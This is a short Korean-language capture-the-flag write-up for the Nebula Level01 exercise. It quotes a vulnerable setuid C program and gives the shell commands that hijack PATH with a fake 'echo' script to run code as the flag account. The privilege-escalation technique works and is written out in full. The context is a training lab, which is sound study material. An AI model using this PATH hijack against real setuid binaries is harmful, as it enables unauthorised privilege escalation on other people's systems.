# Exploit-exercise Nebula Level01
```
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.
```

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

취약점이 있는 프로그램에서 취약점을 찾을 수 있냐고 물어보면서 c 언어 소스코드를 준다.  
`/usr/bin/env` 를 통해 환경변수에서 echo 라는 프로그램 명을 찾아서 `and now what?` 이라는 인자를 주며 실행한다.

그렇다면 환경변수중 프로그램 실행 경로를 찾는 PATH 에 `~/` (홈 디렉토리)를 추가하고 `~/echo` 를 만든 다음, 내용에 `getflag` 를 넣으면 될 것이다.

```
export PATH=~:$PATH
echo "getflag" > ~/echo
chmod a+x ~/echo
/home/flag01/flag01
```

`export` 명령어를 통해 PATH 에 `~` (홈 디렉토리) 를 추가하고,  
`echo "getflag" > ~/echo` 를 통해 `echo` 파일에 `getflag` 를 입력한다.  
`chmod a+x ~/echo` 를 통해 `echo` 파일을 실행할 수 있도록 한 다음에  
`/home/flag01/flag01` 를 입력하면

```
You have successfully executed getflag on a target account
```

라고 뜨면서 풀리게 된다.